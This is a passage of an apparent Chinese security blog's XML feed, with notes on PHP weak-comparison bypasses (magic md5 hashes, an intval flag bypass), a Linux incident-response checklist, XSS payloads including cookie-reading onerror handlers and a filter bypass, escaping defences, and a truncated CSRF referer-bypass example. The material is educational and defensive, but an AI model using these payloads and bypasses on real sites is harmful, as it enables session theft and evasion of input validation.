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 </div>]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP函数漏洞及其绕过姿势</title>
    <url>/2020/08/23/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/PHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h2 id="MD5、SHA1"><a class="header-anchor" href="#MD5、SHA1"></a>MD5、SHA1</h2>
<p>由于php语言特性，在进行md5、sha1值的比较时，可能存在漏洞如下：</p>
<p>1、php的md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
<pre><code class="hljs php">$a[]=<span class="hljs-number">1</span>;
$b[]=<span class="hljs-number">2</span>;
md5($a)===md5($b);	<span class="hljs-comment">//true</span></code></pre>
<p>2、因为php的弱类型特性，哈希结果为<code>0e...</code>的，在进行弱比较时会被当做科学计数法的0处理。以下字符串的md5值都是0e开头的：</p>
<pre><code class="hljs php">QNKCDZO <span class="hljs-comment">//0e830400451993494058024219903391</span>

s878926199a <span class="hljs-comment">//0e545993274517709034328855841020</span>

s155964671a <span class="hljs-comment">//0e342768416822451524974117254469</span>

s214587387a <span class="hljs-comment">//0e848240448830537924465865611904</span>

s214587387a <span class="hljs-comment">//0e848240448830537924465865611904</span>

s878926199a <span class="hljs-comment">//0e545993274517709034328855841020</span>

<span class="hljs-comment">//比较特殊的一个，加密前后进行比较的话会判断为相等</span>
<span class="hljs-number">0e215962017</span> <span class="hljs-comment">//0e291242476940776845150308577824</span></code></pre>
<h2 id="intval"><a class="header-anchor" href="#intval"></a>intval</h2>
<p>得到一个数的整型值。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>);                      <span class="hljs-comment">// 42</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">4.2</span>);                     <span class="hljs-comment">// 4</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'42'</span>);                    <span class="hljs-comment">// 42</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'+42'</span>);                   <span class="hljs-comment">// 42</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'-42'</span>);                   <span class="hljs-comment">// -42</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">042</span>);                     <span class="hljs-comment">// 34</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'042'</span>);                   <span class="hljs-comment">// 42</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">1e10</span>);                    <span class="hljs-comment">// 1410065408</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'1e10'</span>);                  <span class="hljs-comment">// 1</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">0x1A</span>);                    <span class="hljs-comment">// 26</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'0x1A'</span>);				  <span class="hljs-comment">// 0</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42000000</span>);                <span class="hljs-comment">// 42000000</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">420000000000000000000</span>);   <span class="hljs-comment">// 0</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'420000000000000000000'</span>); <span class="hljs-comment">// 2147483647</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>, <span class="hljs-number">8</span>);                   <span class="hljs-comment">// 42</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-string">'42'</span>, <span class="hljs-number">8</span>);                 <span class="hljs-comment">// 34</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span>
<span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>(<span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>));     <span class="hljs-comment">// 1</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>比如在以下代码中</p>
<pre><code class="hljs php">$a = $_GET[<span class="hljs-string">'a'</span>];
<span class="hljs-keyword">if</span>(intval($a)&lt;<span class="hljs-number">2020</span> &amp;&amp; intval($a+<span class="hljs-number">1</span>)&gt;<span class="hljs-number">2020</span>)
	<span class="hljs-keyword">echo</span> $flag;</code></pre>
<p>即可利用 intval 函数对字符串型16进制数的处理漏洞进行绕过</p>
<pre><code class="hljs plain">?a&#x3D;0x10ff	&#x2F;&#x2F;在进行+1运算时，$a会被转换为数值型进行运算.</code></pre>
<h2 id="is-numeric"><a class="header-anchor" href="#is-numeric"></a>is_numeric</h2>
<p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串</p>
<p>绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
<h2 id="mt-rand"><a class="header-anchor" href="#mt-rand"></a>mt_rand</h2>
<p>生成伪随机数，利用<code>php_mt_seed</code>可以通过已知随机数数列爆破出随机数种子</p>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>如何做好应急响应</title>
    <url>/2021/03/08/%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h2 id="整体思路"><a class="header-anchor" href="#整体思路"></a>整体思路</h2>
<p>1）准备</p>
<p>准备检测工具、确定相关人员。</p>
<p>2）检测与分析</p>
<p>入侵事件研判，检索分析态势感知等安全设备产生入侵告警和相关日志，确定攻击者及威胁影响范围。</p>
<p>3）抑制缓解</p>
<p>封堵攻击源、控制威胁影响范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境。</p>
<p>4）攻击溯源</p>
<p>综合分析安全设备告警、日志，主机系统日志、开放服务日志，确定攻击者入侵路径，及时修补存在的漏洞。</p>
<p>5）业务恢复</p>
<h2 id="入侵检查"><a class="header-anchor" href="#入侵检查"></a>入侵检查</h2>
<h3 id="Linux"><a class="header-anchor" href="#Linux"></a>Linux</h3>
<h4 id="常用命令"><a class="header-anchor" href="#常用命令"></a>常用命令</h4>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>last</td>
<td>显示的是目前与过去登入系统的用户相关信息</td>
</tr>
<tr>
<td>lastlog</td>
<td>显示所有用户的登录情况</td>
</tr>
<tr>
<td>lastb</td>
<td>显示用户错误的登录列表</td>
</tr>
<tr>
<td>who</td>
<td>显示的是当前登录的用户</td>
</tr>
<tr>
<td>w</td>
<td>比who显示多一些内容，比如用户当前执行的命令，cpu信息</td>
</tr>
<tr>
<td>history</td>
<td>查看历史命令记录</td>
</tr>
</tbody>
</table>
<h4 id="检查步骤"><a class="header-anchor" href="#检查步骤"></a>检查步骤</h4>
<ul>
<li>
<p>检查账号及登录情况</p>
<p>见这篇文章：<a href="https://dawnyh99.github.io/2021/03/07/%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">Linux系统加固</a></p>
</li>
<li>
<p>检查历史命令</p>
</li>
</ul>
<pre><code class="hljs bash">cat ~/bash_history &gt;&gt; history.txt</code></pre>
<ul>
<li>检查网络连接/开放端口</li>
</ul>
<pre><code class="hljs bash">netstat -antlp | more

<span class="hljs-comment">#查看 PID 所对应的进程文件路径</span>
file /proc/<span class="hljs-variable">$PID</span>/exe</code></pre>
<ul>
<li>检查异常进程</li>
</ul>
<pre><code class="hljs bash">ps aux | grep pid</code></pre>
<p><img src="/2021/03/08/%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20210313142418258.png" class="lazy" data-srcset="/2021/03/08/%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20210313142418258.png" srcset="/images/loadingImage.gif" alt="image-20210313142418258"></p>
<ul>
<li>检查开机启动项</li>
</ul>
<pre><code class="hljs bash">ls /etc/init.d/

ls -l /etc/rc3.d/
ls -l /etc/rc5.d/</code></pre>
<ul>
<li>检查定时任务</li>
</ul>
<pre><code class="hljs bash">ls -al /var/spool/cron/* 
cat /etc/crontab
/etc/cron.d/*
/etc/cron.daily/* 
/etc/cron.hourly/* 
/etc/cron.monthly/*
/etc/cron.weekly/

<span class="hljs-comment">#查看目录下所有文件</span>
more /etc/cron.d/*

/etc/anacrontab
/var/spool/anacron/*</code></pre>
<ul>
<li>检查服务</li>
</ul>
<pre><code class="hljs bash"><span class="hljs-comment">#CentOS</span>
chkconfig  --list  <span class="hljs-comment">#查看服务自启动状态，可以看到所有的RPM包安装的服务</span>
<span class="hljs-comment">#Debian</span>
service --status-all
systemctl list-units
<span class="hljs-comment">#源码包安装的服务位置</span>
/usr/<span class="hljs-built_in">local</span>/</code></pre>
<ul>
<li>
<p>检查异常文件</p>
<ul>
<li>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</li>
<li>针对可疑文件可以使用<code>stat</code>查看创建修改时间</li>
<li>发现WebShell、远控木马的创建时间</li>
</ul>
<p>找出同一时间范围内创建的文件？</p>
</li>
</ul>
<pre><code class="hljs bash">find ./ -iname <span class="hljs-string">"*"</span> -atime 1 -<span class="hljs-built_in">type</span> f 
<span class="hljs-comment">#找出 ./ 下一天前访问过的文件</span></code></pre>
<ul>
<li>检查日志文件</li>
</ul>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th style="text-align:center">日志文件</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">/var/log/cron</td>
<td style="text-align:center">记录系统定时任务相关的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/message</td>
<td style="text-align:center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
</tr>
<tr>
<td style="text-align:center">/var/log/syslog</td>
<td style="text-align:center">只记录警告信息，常常是系统出问题的信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/btmp</td>
<td style="text-align:center">记录<strong>错误登录（登陆失败）<strong>日志；使用</strong>lastb</strong>命令查看</td>
</tr>
<tr>
<td style="text-align:center"><strong>/var/log/lastlog</strong></td>
<td style="text-align:center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
</tr>
<tr>
<td style="text-align:center"><strong>/var/log/wtmp</strong></td>
<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
</tr>
<tr>
<td style="text-align:center"><strong>/var/log/utmp</strong></td>
<td style="text-align:center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
</tr>
<tr>
<td style="text-align:center">/var/log/secure</td>
<td style="text-align:center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码</td>
</tr>
<tr>
<td style="text-align:center">/var/log/apache2/error.log</td>
<td style="text-align:center">apache错误日志，如果安装有modsecurity那么其攻击拦截日志也存在这里</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>蓝队技术</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS笔记</title>
    <url>/2020/08/03/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/XSS%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="常用payload"><a class="header-anchor" href="#常用payload"></a>常用payload</h2>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">"xss"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">test1</span>')&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">Wufff</span>!')&gt;</span>click me!<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://url.to.file.which/not.exist"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie);</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/跨站/)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert(/insight-labs/)</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></code></pre>
<p><strong>一些绕过方法：</strong></p>
<pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 空格过滤：使用左斜线/代替空格 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>"<span class="hljs-attr">xss</span>")&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre>
<h2 id="XSS的防御"><a class="header-anchor" href="#XSS的防御"></a>XSS的防御</h2>
<h3 id="过滤输入"><a class="header-anchor" href="#过滤输入"></a>过滤输入</h3>
<p>对输入和URL参数进行过滤(白名单和黑名单)</p>
<h3 id="转义输出"><a class="header-anchor" href="#转义输出"></a>转义输出</h3>
<p><strong>1&gt;</strong> 作为body文本输出，作为html标签的属性输出：</p>
<p>比如：</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>$&#123;username&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>,

<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">c:out</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"$&#123;username&#125;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c:out</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"$&#123;username&#125;"</span> /&gt;</span></code></pre>
<p>此时的转义规则如下：</p>
<p>&lt; 转成 <code>&amp;lt;</code></p>
<p>&gt; 转成 <code>&amp;gt;</code></p>
<p>&amp; 转成 <code>&amp;amp;</code></p>
<p>&quot; 转成 <code>&amp;quot;</code></p>
<p>’ 转成 <code>&amp;#39;</code></p>
<p><strong>2&gt;</strong> javascript事件</p>
<pre><code class="hljs javascript">&lt;input type=<span class="hljs-string">"button"</span> onclick=<span class="hljs-string">'go_to_url("$&#123;myUrl&#125;");'</span> /&gt;</code></pre>
<p>除了上面的那些转义之外，还要附加上下面的转义：</p>
<p>\ 转成<code>\\</code></p>
<p>/ 转成 <code>\/</code></p>
<p>; 转成 <code>；</code>(全角分号)</p>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试基础</title>
    <url>/2021/03/04/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝队基础</title>
    <url>/2021/03/04/%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF/%E8%93%9D%E9%98%9F%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="常见漏洞原理"><a class="header-anchor" href="#常见漏洞原理"></a>常见漏洞原理</h2>
<h3 id="XSS"><a class="header-anchor" href="#XSS"></a>XSS</h3>
<h4 id="原理"><a class="header-anchor" href="#原理"></a>原理</h4>
<p>应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分</p>
<h4 id="危害"><a class="header-anchor" href="#危害"></a>危害</h4>
<p>一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。攻击者可以获取受害者的cookie等</p>
<p>JavaScript脚本可以跨域访问，<code>&lt;script&gt;</code>标签可以请求外部的js脚本，并且外部js脚本请求来之后是被认为与被攻击服务器同源的，所以可以访问当前服务器的cookie，所以反射型XSS的利用方式：构造恶意链接，将请求恶意js脚本的<code>&lt;script&gt;</code>作为参数传给服务器，在我们的恶意js脚本中可以使用加载图片的方式，将cookie作为参数传给我们的接收服务器</p>
<p>获取cookie：<a href="https://blog.csdn.net/l31299/article/details/72792613">https://blog.csdn.net/l31299/article/details/72792613</a></p>
<pre><code class="hljs plain">document.cookie</code></pre>
<h4 id="三种类型比较"><a class="header-anchor" href="#三种类型比较"></a>三种类型比较</h4>
<p>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
<p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和转义，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>
<p>存储型XSS攻击即攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
<h4 id="防御方法"><a class="header-anchor" href="#防御方法"></a>防御方法</h4>
<p>过滤输入和转义处理</p>
<ul>
<li>在输入方面对所有用户提交内容进行输入验证，提交内容包括URL、查询关键字、http头、post数据等。</li>
<li>在输出方面，使用<code>htmlentities()</code>函数进行转义标签内的内容不会解释，直接显示。</li>
</ul>
<h3 id="CSRF"><a class="header-anchor" href="#CSRF"></a>CSRF</h3>
<h4 id="防御方法-2"><a class="header-anchor" href="#防御方法-2"></a>防御方法</h4>
<ul>
<li>
<p>检查referer：敏感操作来源不能为本站点之外</p>
</li>
<li>
<p>设置token：用以检查请求来自当前页面</p>
</li>
</ul>
<h4 id="referer检测绕过"><a class="header-anchor" href="#referer检测绕过"></a>referer检测绕过</h4>
<p>1、http头不包含referer：使用<code>data:</code>协议</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
